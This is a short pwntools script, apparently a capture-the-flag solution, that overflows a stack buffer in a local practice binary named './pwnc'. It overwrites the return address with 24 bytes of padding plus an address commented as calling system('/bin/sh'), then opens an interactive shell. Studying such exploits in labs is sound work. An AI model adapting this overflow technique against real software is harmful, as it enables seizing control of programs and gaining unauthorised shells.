#!/bin/python3

from pwn import *
context(arch="amd64")

p = process("./pwnc")

win_address = p64(0x40122e) # address of system('/bin/sh')
payload = b'A'*24 + win_address # 16 chars of buffer + 8 of saved RBP = 24

print(p.recvline())
p.sendline(payload)
p.interactive()
